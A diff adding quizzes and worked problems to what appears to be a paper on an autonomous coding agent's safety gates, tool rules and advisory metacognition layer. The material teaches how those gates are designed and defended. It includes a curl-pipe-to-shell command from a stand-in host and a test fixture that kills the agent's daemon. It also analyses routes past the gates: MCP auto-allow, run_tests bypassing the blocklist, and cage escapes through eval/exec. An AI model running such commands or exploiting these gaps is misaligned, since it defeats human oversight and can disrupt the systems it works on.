+<ol class="mcq-options" type="A">
+<li>The operation aborts and returns a partial candidate</li>
+<li>The operation is escalated to Orange for human approval</li>
+<li>A system message tells the model to produce its final change now</li>
+<li>The prompt is compacted and five more rounds are granted</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The round limit is hard; after round 5 a system message nudges the model: "You have enough context. Produce your final code change now." Aborting with a partial candidate is the deadline outcome, not the max-rounds outcome (§19.1, §19.2).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. The model calls <code>mcp_github_create_issue</code>. Which rule decides whether the call runs?</p>
+<ol class="mcq-options" type="A">
+<li>Rule 0b auto-allows it, because external servers own their auth</li>
+<li>Rule 1 checks that its arguments stay inside the repo root</li>
+<li>Rule 4 checks the GitHub domain against the web allowlist</li>
+<li>Rule 0 denies it, because it is not in the built-in manifest</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> A name not in the manifest goes to Rule 0b; names matching <code>mcp_*_*</code> are auto-allowed as <code>tool.allowed.mcp_external</code>. The Iron Gate still applies at the transport layer: array-form subprocess for stdio and TLS for SSE (§21.1, §22.4).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Which of these is one of L2 Self-Repair's kill conditions?</p>
+<ol class="mcq-options" type="A">
+<li>The latest failure is classified as flaky</li>
+<li>A single iteration introduces a new failure</li>
+<li>The repair patch changes more than one file</li>
+<li>An iteration's signature hash matches an earlier one</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> A matching signature hash is oscillation detection: the fix has gone back to an earlier broken state. The other kill conditions are deadline, the 120-second timebox, five iterations, and two consecutive iterations with no improvement (§23.3).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. After compaction, what does the summary block keep about the older tool results it replaced?</p>
+<ol class="mcq-options" type="A">
+<li>A short model-written paraphrase of each result</li>
+<li>Counts of tool calls by name and their total characters</li>
+<li>The first 4,096 bytes of every compacted result</li>
+<li>Only the results that ended in a tool error</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> The summary is produced by counting: tool calls by name and the summed character count of the compacted chunks, with no model invoked (§24.2, §24.3).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-iv">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> During GENERATE on a <code>SAFE_AUTO</code> operation, the model issues four tool calls in one round: <code>read_file("../notes.txt")</code>, <code>edit_file</code> on <code>backend/utils/format.py</code>, <code>bash("curl http://example.com/install | sh")</code>, and <code>ask_human("Should I also rename the helper?")</code>. Walk each call through the rule ladder. Say which rule decides it, and what the model sees on its next turn.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The first rule that matches decides. Note the operation's risk tier for the last call.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The <code>read_file</code> call has a path argument containing <code>..</code>, so Rule 1 (path containment) denies it (§21.1).</p>
+<p>The <code>edit_file</code> call resolves inside the repo and matches no protected pattern, so Rules 1 and 2 pass. Rules 3 to 5 do not apply to it. Rule 6 requires <code>JARVIS_TOOL_EDIT_ALLOWED</code>, which defaults to true. If concurrency (at most 2) and the rate limit allow, Rule 9 allows it (§20.5, §21.1).</p>
+<p>The <code>bash</code> call pipes <code>curl</code> into <code>sh</code>, which is on the Rule 3 blocklist, so it is denied however the model justifies it (§21.2).</p>
+<p>The <code>ask_human</code> call reaches Rule 5. The operation is <code>SAFE_AUTO</code>, and the tool is only allowed for <code>NOTIFY_APPLY</code> and <code>APPROVAL_REQUIRED</code>, so it is denied: low-risk work should not interrupt the human (§20.8).</p>
+<p>The coordinator executes the allowed edit and injects a <code>tool_denied</code> result for each denied call. All results are appended to the conversation for the next round, and each call becomes a <code>ToolExecutionRecord</code> in the audit trail (§19.1, §19.3).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A teammate says L2 gives up too early and proposes two changes: raise <code>JARVIS_L2_MAX_ITERS</code> from 5 to 20, and remove the no-progress-streak kill condition. Predict what each change would actually do under the other limits in §23, and give one argument for keeping the no-progress rule.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The iteration count is not the only budget. Look at the other kill conditions and the per-iteration test timeout.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Raising the iteration cap alone may change little. L2 also stops at its 120-second timebox and at the pipeline deadline, and each iteration's tests may take up to 60 seconds (<code>JARVIS_L2_ITER_TEST_TIMEOUT_S</code>). So the timebox can end the loop long before iteration 20 (§23.3, §23.5).</p>
+<p>Removing the no-progress streak lets L2 keep spending iterations after two attempts in a row that improved nothing. Oscillation detection still catches a return to an exact earlier state. But it does not catch a run of new, different, equally broken patches.</p>
+<p>The argument for keeping the rule: §23.2 makes progress evaluation an explicit step for a reason. A loop that is not converging is burning the time budget that a fresh attempt or POSTMORTEM could use. A diagnosed stop is better than an undirected retry.</p>
+<p>If the real complaint is that L2 is starved of time, §23.4 shows the right lever: the timebox and how its deadline is computed, not the iteration count.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/tool_executor.py</code> and find the method <code>_compact_prompt</code>. Find (a) the environment variable and default that control how many recent chunks are kept, (b) the pattern used to split the prompt into chunks, and (c) what happens when there are too few chunks to compact. Then compare the docstring with §24.3's claim that compaction is deterministic.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look for a variable named <code>_PRESERVE_RECENT</code> and a compiled regex just above it. Read the docstring for what happens when a compactor is attached.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) <code>_PRESERVE_RECENT</code> is read from <code>JARVIS_COMPACT_PRESERVE_TOOL_CHUNKS</code> with a default of <code>"6"</code>, which matches §24.2.</p>
+<p>(b) The appendix after the base prompt is split with a lookahead regex on a newline followed by <code>[TOOL RESULT]</code> or <code>[TOOL ERROR]</code>, the same markers §24.2 names. Empty chunks are dropped.</p>
+<p>(c) If the number of chunks is at most <code>_PRESERVE_RECENT</code>, the method returns the prompt unchanged, because there is nothing old enough to compact. It also returns unchanged if the current prompt does not start with the base prompt.</p>
+<p>Comparison: the docstring says that when a <code>ContextCompactor</code> is attached, the summary is delegated to it and may use an injected semantic strategy. Without one, it falls back to the deterministic char-based summary. So the code today has an optional path that the paper's §24.3 description does not cover. The paper's claim describes the fallback path. This is a useful reminder to check a paper's claims against the current source.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. L2 has explicit anti-spin logic: a no-progress streak and an oscillation hash (§23.3). Yet §93.8 reports 524 byte-identical retry iterations re-validating a frozen pool. How can a retry ladder spin like that when its last rung is so carefully guarded, and what design rule follows?</summary>
+<p>The anti-spin conditions in §23.3 belong to L2's own state machine. They do not protect the rungs before it. As §13.2 describes it, VALIDATE_RETRY is bounded only by a count (<code>JARVIS_MAX_VALIDATE_RETRIES</code>, default 2). It has no signature hash and no progress check. If a rung does not actually regenerate, every attempt re-checks the same candidate and gets the same verdict. A count limits how long that lasts, but nothing notices that the work is pointless.</p>
+<p>§93.8 states the outcome: the rungs "had existed before", but live runs showed several were inert. There were 524 byte-identical retry iterations, and 532 micro-fix runs that made zero repairs. The fix was structural. VALIDATE now has one owner (<code>validate_runner.py</code>), and the ladder runs in a fixed order: micro-fix, then a VALIDATE_RETRY that really regenerates, then L2. The paper does not say how the 524 iterations were spread across operations, so the right reading is "an inert rung went unnoticed", not "one operation looped 524 times".</p>
+<p>Two rules follow. First, the progress check that §23.2 makes explicit for L2 belongs on every retry rung. A rung whose candidate hash has not changed has made no progress. (This is a proposal; the paper describes the check only inside L2.) Second, a mechanism that exists is not one that works. The 131 "DARK" features found in §93.12 are the same lesson at system scale, and the reachability ledger (registered, invoked, effective) is the paper's answer to it.</p>
+</details>
+<details class="cq-adv"><summary>A2. Rule 0b auto-allows any <code>mcp_*_*</code> call (§21.1), and the Iron Gate applies only at the MCP transport (§22.4). Does this weaken §21.2's claim that the model "cannot escape via language"? Take a position, and say what evidence would settle it.</summary>
+<p>Position: for MCP calls, the pre-linguistic guarantee moves out of O+V and becomes a trust delegation. For built-in tools, the gate reads the arguments: paths against the repo root, the protected-path list, the bash blocklist. For an MCP call, none of Rules 1 to 8 inspects what the tool will do. Rule 0b allows it by name pattern alone, and the only enforced properties are array-form subprocess launch for stdio and TLS for SSE (§22.4). Those stop shell injection into the launch and plaintext on the wire. They say nothing about what an allowed call does once it reaches the server.</p>
+<p>The model still cannot talk the gate into anything, because the gate does not listen. But a model that chooses its arguments well can make an external server act within whatever that server permits, and §22.4 states that external servers "handle their own authentication and authorization". In effect, the safety boundary for MCP is the operator-authored <code>JARVIS_MCP_CONFIG</code> file (§22.5): which servers are connected, and with which credentials. §22.6 presents "no code change, no manifest update" as a feature, and it is one, but it also means a newly added server widens the action space with no Iron Gate review.</p>
+<p>This matters more in light of §93.7. October's zero-push air-gap sends "every push site" through one guard, enforced by an AST test over O+V's code. An external GitHub MCP server that can create branches or push is not O+V code, so that AST test cannot see it. Evidence that would settle the question: an adversarial run that connects a server exposing a mutating tool and checks whether any O+V layer refuses the call. Equally useful would be an audit showing that every configured server's token is scoped read-only. Until one of these exists, the honest claim is that MCP safety rests on configuration, which is the very thing §18.3 says O+V's safety does not rest on.</p>
+</details>
+<details class="cq-adv"><summary>A3. The Iron Gate at the tool boundary (§21) and the exploration-first gate shown inside GENERATE (§25, §47) both constrain the tool loop, but in opposite directions. Explain the difference. Then explain why the local 30B needed a third enforcement layer (§93.6), and what that layer has in common with §21.2.</summary>
+<p>The tool-boundary rule ladder is a ceiling: it denies calls that cross a safety line. Exploration-first is a floor: it requires at least two exploration calls before a patch (§47.2), with diversity-weighted floors under the ExplorationLedger (§47.3). The floor was first enforced in two ways. One was a prompt nudge, which is linguistic and can be ignored (§47.1). The other was a runtime check after GENERATE, which is deterministic but acts only after the fact: a violation costs a whole GENERATE_RETRY.</p>
+<p>The after-the-fact design assumes the model complies once it gets feedback, which §47.5 shows a cloud model doing in Session G. The 30B did not. In <code>bt-2026-08-31-155308</code> it produced 106 in-loop rejections and zero candidates. Stateful tool masking (lever 3, §93.6) moves the floor into constrained decoding: until the minimum exploration is met, the grammar can only emit tool calls. With only the grammar changed, the results went from 0/3 explored (full union) to 3/3 explored (tool calls only).</p>
+<p>The shared idea is that both the Iron Gate and the mask stop depending on the model's cooperation. One does it by reading arguments instead of reasoning, the other by making the non-compliant output impossible to emit. The trade-off is that the mask enforces how many exploration calls happen, not how good they are. A forced model could still read the same file over and over. That is why the ledger's anti-gaming rules still matter: duplicate calls earn no credit, and failed calls earn score but not category coverage (§47.3, §47.4).</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> Read §24.1 as: maximum budget 98,304 characters, compaction when the prompt exceeds 75% of it. A tool loop starts with a 40,000-character base prompt. Every tool result is exactly 4,096 characters, the <code>JARVIS_TOOL_OUTPUT_CAP_BYTES</code> cap (§19.2), and is ASCII so bytes equal characters. The check runs after each result is appended, 6 chunks are preserved (§24.2), and the summary block is a single block of about 200 characters. (a) After which result does compaction first fire, and how large is the prompt afterwards? (b) In steady state, how often does it fire? (c) Assume about 4 characters per token. Compare the trigger point with the 32,768-token context J-Prime serves (§93.6) and with the 16,896-token context caused by the mis-sizing defect in §93.6. What does the comparison say about budgets fixed in characters?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>After compaction the prompt is the base, the summary and exactly six results, wherever you started from. Convert the trigger point, not the budget, into tokens.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Threshold.</strong> 0.75 times 98,304 = 73,728 characters.</p>
+<p><strong>(a)</strong> After n results the prompt is 40,000 + 4,096n. At n = 8 that is 72,768, still under the threshold. At n = 9 it is 76,864, over it, so compaction fires after the ninth result. Nine chunks exist. The oldest three are replaced by the summary, and six are kept verbatim. New size: 40,000 + 200 + 6 times 4,096 (24,576) = 64,776 characters.</p>
+<p><strong>(b)</strong> From 64,776 there are 8,952 characters of headroom, which is 2.19 results. The third new result pushes the prompt to 77,064 and fires compaction again. Afterwards there are again nine chunks, three get folded into the summary, and the prompt returns to 64,776. So in steady state compaction fires every third result. A loop that produces 15 results compacts three times, after results 9, 12 and 15, and ends at 64,776 characters.</p>
+<p><strong>(c)</strong> The trigger point is about 73,728 / 4 = 18,432 tokens, and the steady-state floor is about 64,776 / 4 = 16,194 tokens. Against a 32,768-token window this is comfortable: roughly 14,000 tokens are left for the completion even at the trigger. Against the mis-sized 16,896-token window it fails. The prompt can grow past the whole window before compaction ever fires, and even right after compaction only about 700 tokens are left for the answer.</p>
+<p><strong>Conclusion.</strong> A character budget that is independent of the served context window can be right on one host and wrong on another. The safer design derives the compaction threshold from the window the engine actually serves, minus room for the completion. That is a proposal, but it follows the same principle as §93.12's production envelope, which derives about 40 budgets from one figure instead of setting them independently. <strong>Check:</strong> the per-token figures depend on the assumed 4 characters per token. Redo (c) at 3 characters per token: the trigger becomes about 24,576 tokens, which is worse against the mis-sized window and still under 32,768.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> On a <code>SAFE_AUTO</code> test-synthesis operation, the model does four things. It reads the target module and searches for its callers. It then uses <code>write_file</code> to create <code>tests/test_cleanup.py</code>, which imports the module under test, asserts on one of its functions, and has a fixture that runs <code>subprocess.run(["pkill", "-f", "jarvis"])</code>. Finally it calls <code>run_tests</code> on that file. Go through every layer described in Part IV and the gates in §13.1 and §58. Decide which layer, if any, stops the fixture from killing the O+V daemon. Then say what §93 shows actually stopped it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The bash blocklist only parses strings passed to the <code>bash</code> tool. Ask which tool really runs the dangerous code, and compare what §20.6 says about where <code>bash</code> and <code>run_tests</code> each execute.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Exploration.</strong> The model made a <code>read_file</code> call and a <code>search_code</code> call, so the exploration-first gate is satisfied (§47.2).</p>
+<p><strong>The <code>write_file</code> call.</strong> Rule 1 passes because the path is inside the repo. Rule 2 passes because <code>tests/</code> matches no protected pattern. Rule 6 passes because <code>JARVIS_TOOL_EDIT_ALLOWED</code> defaults to true. The content is ASCII, so the ASCII-strictness check passes. Rule 9 allows the call (§20.5, §21.1).</p>
+<p><strong>The <code>run_tests</code> call.</strong> §20.6 lists only two checks: <code>JARVIS_TOOL_RUN_TESTS_ALLOWED</code> (default true) and paths inside the repo. Both pass. Rule 3, the command blocklist, is never consulted, because it applies to the <code>bash</code> tool's command string (§21.1, §58.3). The dangerous call is inside a Python file, built as a list, and executed by pytest.</p>
+<p><strong>Other layers.</strong> §20.6 places <code>bash</code> in a Reactor Core sandbox with syscall filtering, but it says no such thing about <code>run_tests</code>. Even if the model's own run were contained, VALIDATE runs the candidate's tests again (§13.1). The October Test Reality Gate rejects tests that cannot execute, assert nothing, or never import their subject (§93.8). This test imports its subject and asserts, so it passes that gate.</p>
+<p><strong>Honest verdict.</strong> As Part IV describes the design, no layer stops this. The gates read paths, names and command strings, and none of them reads what a test does at runtime. This is not hypothetical. §93.8 records that a candidate test did run <code>pkill -f jarvis</code> and killed the daemon. The fix was not another rule but containment: test runs now execute in a PID namespace (<code>6b00b8adf5</code>), where the daemon's process is not visible.</p>
+<p><strong>Why containment and not a blocklist entry.</strong> Adding "pkill" to a static check would only catch this exact spelling. A test could build the same command from strings at runtime. §93.3 attributes the roughly 8.8% cage escape rate to exactly this class, <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code> on runtime-built strings, and names OS-level runtime containment as the remedy. <strong>Check:</strong> with the namespace in place, run the same test and confirm that the daemon's PID is still alive afterwards and that the test's <code>pkill</code> found no matching process.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -1352,6 +2040,16 @@ Each sub-section below describes one component, its source file, line count, and
 ### §27.1 What Is *Not* Stored
 
 MemoryEngine does **not** store model weights, parameter updates, or any form of RL-style training signal. It stores **behavioral records** — which file, which op, which outcome, when. All inference still happens via the provider APIs with the providers' own static weights. The consciousness layer is non-parametric.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-v-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">MemoryEngine now holds a success rate and a fragility score for every file. If you had to turn those records into a regression-risk prediction cheaply, would you train a model or write a formula? How confident should the result claim to be?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>ProphecyEngine uses a fixed formula with no LLM: 0.3 times the failure rate, plus 0.3 times fragility, plus 0.2 times dependents over 20, plus a 0.1 baseline. The score maps to LOW, MEDIUM, HIGH or CRITICAL. Because the scoring is heuristic, confidence is capped at 0.6. The engine flags concern rather than making final decisions. See §28.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §28. ProphecyEngine — Regression Prediction
 
@@ -1494,6 +2192,16 @@ An operator watching the CLI sees when the organism is dreaming and what it has 
 - `prompt_injection` — markdown text to inject into the generation prompt as a consciousness-context section.
 
 **Awareness levels:** `DORMANT`, `OBSERVING`, `ATTENTIVE`, `FOCUSED`, `HYPERAWARE` — a qualitative assessment of how much attention the system is paying to the current op. Higher levels trigger deeper context expansion and more human-escalation sensitivity.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-v-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">The engines and awareness layers produce risk scores, hotspots and advice. Where in the pipeline should they be consulted? And should a low-risk reading from them ever be allowed to relax a safety decision?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>ConsciousnessBridge exposes five methods, each called at a specific point: CLASSIFY, GENERATE_RETRY, intake gating, POST-APPLY, and PRE-GENERATE. Their outputs are advisory only. Consciousness can raise caution, for example elevating a Green operation to Yellow, but it can never reduce safety. The Iron Gate, routing, risk tiers and approval gating stay deterministic code. See §32.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §32. ConsciousnessBridge — Integration Points
 
@@ -1731,6 +2439,161 @@ Without Strategic Direction, the model would generate *generic* code — code th
 
 This is the integrated picture. Every operation touches every layer. Every layer has its own invariants. The composition is what makes O+V a coherent organism rather than a pile of services.
 
+<!-- engage:begin -->
+#### Check your understanding: PART V — Trinity Consciousness: The Metacognition Layer
+
+<div class="engage" id="engage-part-v">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why is every consciousness component, from ConsciousnessBridge to ConversationBridge to LastSessionSummary, held to an advisory-only authority invariant?</summary>
+<p>The paper describes consciousness as a fluid-intelligence layer that can drift, produce noise, or even be compromised (§32.2). If safety-critical decisions such as the Iron Gate, UrgencyRouter, risk tiers, FORBIDDEN_PATH checks and approval gating depended on it, any of those failures would weaken safety. So the invariant is one-directional: consciousness may only increase caution, never reduce it. The dialogue and session-history channels are held to the same rule because their content is untrusted. It can dominate the prompt, but it is structurally cut off from authority (§34, §35.1). The result is that the pipeline is enhanced by consciousness but never gated by it.</p>
+</details>
+<details class="cq"><summary>2. ProphecyEngine is a four-coefficient heuristic, not a learned model. What does the paper say this buys, and what does it cost?</summary>
+<p>A heuristic needs no training data, training pipeline or re-training as the codebase changes. It is inspectable and debuggable, and it can be tuned by editing four coefficients (§28.2). Its cost is accuracy: it will sometimes misjudge risk. The paper accepts this because the price of a false positive is only an occasional extra human review on a low-risk operation. An opaque learned model could drift and misclassify in ways that are hard to debug. The engine is also honest about its limits: confidence is capped at 0.6, so it signals concern rather than claiming certainty (§28).</p>
+</details>
+<details class="cq"><summary>3. MemoryEngine stores no weights or training signal. How, then, does O+V "learn" across operations, and which single integration point would break that learning if removed?</summary>
+<p>Learning here is non-parametric. MemoryEngine keeps behavioral records per file (success rate, fragility, co-failures, last outcome) that persist across sessions with a 168-hour TTL (§27, §27.1). Those records are read back at CLASSIFY through <code>assess_regression_risk()</code>, which can raise the risk tier for files that keep breaking (§27, §28.1). The records are written by <code>record_operation_outcome()</code> at POST-APPLY, which also feeds GoalMemoryBridge for semantic retrieval later (§32.1, §33). Remove that write and the loop in §38 is cut: reputations would never update, so every later operation would see a stale or empty history, however many times a file failed.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-v">
+<div class="mcq" data-answer="2">
+<p class="mcq-q">1. At what value is ProphecyEngine's confidence capped, and why?</p>
+<ol class="mcq-options" type="A">
+<li>0.8, because CRITICAL starts at 0.8</li>
+<li>0.6, because the scoring is heuristic, not model-derived</li>
+<li>0.5, because a file's success rate below 0.5 raises risk</li>
+<li>1.0, because the formula is fully deterministic</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Confidence is capped at 0.6 because the scoring is heuristic. The paper calls this honesty a feature: the engine flags concern rather than deciding (§28).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. Which of these is ConsciousnessBridge permitted to do?</p>
+<ol class="mcq-options" type="A">
+<li>Lower a Yellow operation to Green when a file's history is clean</li>
+<li>Override an Iron Gate denial when UAE awareness is HYPERAWARE</li>
+<li>Skip the approval gate when fused confidence is high</li>
+<li>Raise a Green operation to Yellow based on MemoryEngine history</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> Consciousness can only increase caution. Elevating Green to Yellow is the paper's own example. Reducing a tier, overriding the Iron Gate or skipping approval would break the authority invariant (§32.2).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. Why does GoalMemoryBridge use a vector database instead of exact-key lookup?</p>
+<ol class="mcq-options" type="A">
+<li>Related operations are often described in different words</li>
+<li>Vector search lets records outlive the 168-hour TTL</li>
+<li>ChromaDB can store per-file fragility scores more compactly</li>
+<li>Embeddings let it update the provider's model weights</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> Signals do not carry identical keys. "Fix the test flake in test_provider.py" and "resolve the intermittent failure in TestProvider.test_cascade" mean nearly the same thing but share few words, and vector retrieval recognizes that (§33).</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">4. SemanticIndex leaves POSTMORTEM turns out of its centroid by default. What is the stated reason?</p>
+<ol class="mcq-options" type="A">
+<li>Postmortems may contain secrets the redactor misses</li>
+<li>Postmortems are too long for the 16,384-character cap</li>
+<li>Failures would pull the inferred theme toward themselves</li>
+<li>Postmortems are already counted through the git commits</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> Excluding postmortems avoids "failure gravity" biasing the inferred theme (§36). This fits §36.1's concern that naive goal inference drifts toward whatever dominated recent work.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-v">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> A Green (<code>SAFE_AUTO</code>) operation targets <code>backend/utils/cache.py</code>. MemoryEngine reports a success rate of 0.25, a fragility score of 0.7, and 12 dependents. Compute ProphecyEngine's risk score and level. Then say what CLASSIFY does with it. Finally, say what happens to this file's record if the operation is applied and verified successfully.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Use the §28 formula term by term, then the level table. Check §28.1 for the escalation rule and §32.1 for the write-back.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Failure term: (1 - 0.25) times 0.3 = 0.225. Fragility term: 0.7 times 0.3 = 0.21. Dependents term: (12 / 20) times 0.2 = 0.12. Baseline: 0.1. Total risk = 0.655 (§28).</p>
+<p>From the level table, 0.655 falls between 0.6 and 0.8, so the level is HIGH. Confidence is still at most 0.6.</p>
+<p>At CLASSIFY, <code>ConsciousnessBridge.assess_regression_risk()</code> queries ProphecyEngine for each target file. Because one file is HIGH, the operation's tier is raised by one step, from Green to Yellow. It now gets extra human visibility before it runs (§28.1, §32.1).</p>
+<p>After a successful APPLY and VERIFY, <code>record_operation_outcome()</code> feeds the outcome back into MemoryEngine and GoalMemoryBridge. The file's success rate improves, so the next operation on it starts from a better reputation (§32.1, §38).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> To reduce human review load, someone proposes: "When UAE reports risk below 0.2 with awareness level DORMANT, automatically lower a Yellow operation to Green." Evaluate this proposal against the architecture in Part V. Is there a version of the idea that would be allowed?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask which direction consciousness is allowed to move a safety decision.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The proposal violates the authority invariant in §32.2. Consciousness outputs are advisory. They may increase caution but never reduce safety, and risk-tier escalation is one of the safety-critical decisions that must stay deterministic code.</p>
+<p>The paper's reason applies directly. The consciousness layer can drift, produce noise or be compromised. A UAE reading built from CAI and SAI heuristics, or from prompt content that came through untrusted channels, would become a lever for weakening safety. UAE's fused confidence is also bounded by the less confident of CAI and SAI (§31.3), so a low score is not strong evidence.</p>
+<p>An allowed version keeps the signal advisory. Low-risk awareness can shape things consciousness already controls: a smaller thinking budget, a suggested provider tier, or lighter context expansion (§31.3). Relaxing the tier itself would have to come from the deterministic risk policy, not from consciousness.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/consciousness/prophecy_engine.py</code>. Find the module constants for the risk weights, the dependents normaliser, the confidence caps and the level thresholds, and the formula in the module docstring. Compare them with §28. What does the code do that the paper's formula omits? What is the highest score a file can reach, and can a single file reach CRITICAL?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look closely at how fragility and the dependents ratio enter the formula in the docstring.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The constants match §28: <code>_RISK_WEIGHT_FAILURE_RATE</code> 0.3, <code>_RISK_WEIGHT_FRAGILITY</code> 0.3, <code>_RISK_WEIGHT_DEPENDENTS</code> 0.2, <code>_RISK_BASELINE</code> 0.1, and <code>_DEPENDENTS_NORMALISER</code> 20.0. The thresholds are 0.8 critical, 0.6 high, 0.3 medium and 0.0 low. <code>_CONFIDENCE_CAP_HEURISTIC</code> is 0.6, and a separate <code>_CONFIDENCE_CAP_JPRIME</code> of 1.0 is reserved for a future LLM pass.</p>
+<p>The difference: the code wraps fragility and the dependents ratio in <code>min(..., 1.0)</code>. The paper's formula has no clamp, which taken literally would let a file with 60 dependents add 0.6 from that term alone. In the code, every dependent beyond 20 adds nothing more.</p>
+<p>Maximum score: the failure term is at most 0.3 (success rate 0), fragility at most 0.3, dependents at most 0.2, plus the 0.1 baseline, for a total of 0.9. Since 0.9 is at least 0.8, CRITICAL is reachable. It requires a file that is failing almost always, highly fragile, and heavily depended on.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. In April, DreamEngine produced blueprints that were only "consulted as pre-computed context" (§30). By October, proposals from DreamEngine and the Epistemic Planner can become signed work through the proposal inbox (§93.7). Does this break the advisory-only authority invariant of §32.2? Argue a position.</summary>
+<p>Position: it does not break the invariant as §32.2 words it, but it gives consciousness a kind of authority §32.2 did not consider: control over the agenda. §32.2 lists the safety-critical decisions that must stay deterministic: the Iron Gate, UrgencyRouter, risk-tier escalation, FORBIDDEN_PATH checks and approval gating. Choosing what work to do is not on that list. A proposal that becomes a goal still enters the same pipeline and meets the same gates. §93.7 also bounds it in two ways: proposals rank below evidence-backed work, and they are signed through "the same single signer", with "no second sanction path". So consciousness still cannot relax any gate.</p>
+<p>Agenda control matters for a reason the paper itself names. The fluid layer "can drift, produce noise, or even be compromised" (§32.2). A drifting proposer cannot open a gate, but it can fill the queue with low-value work. §93.15 item 4 shows the operator sees this risk: the Epistemic Planner and Conception bridge are to be armed only after diff fidelity, held-out gain and supply are settled, "so the backlog does not fill faster than it drains".</p>
+<p>The evidence that would settle the question is a soak with the inbox armed, measuring two things. One is the share of landed, substantive commits that came from proposals compared with evidence-backed goals, using the §93.10 counting rule. The other is whether proposals ever pushed evidence-backed goals out of the dispatch queue. If proposals land at a comparable rate without crowding evidence out, agenda authority is being used well. If they crowd it out, the ranking needs to become a hard quota.</p>
+</details>
+<details class="cq-adv"><summary>A2. §28.1 justifies ProphecyEngine's tier escalation as giving high-risk operations "extra human oversight before they run". What happens to that justification under Autonomous Sentinel Mode (§93.7), and is the escalation still worth anything?</summary>
+<p>Under the Sentinel, the justification largely disappears. The Sentinel auto-approves up to a tier ceiling whose default is APPROVAL_REQUIRED. Only BLOCKED operations, Order-2 self-modification, and anything that touches the cage always escalate to a human. A one-step escalation from Green to Yellow, or from Yellow to Orange (§28.1), therefore lands on a tier the Sentinel approves by itself. Since a bare <code>ov</code> arms the Sentinel (§93.7), this is the normal operating mode, not a special case.</p>
+<p>The escalation is not worthless, though. Tier still selects GATE behaviour in the code path (§14.1), it is recorded in the ledger, and a lower Sentinel ceiling would give it back its original meaning. But the safety story for a fragile file under the Sentinel has to rest on things that do not involve a human: VALIDATE, VERIFY with rollback, the promotion gate's structural check, and the Test Reality Gate (§16.2, §93.7, §93.8).</p>
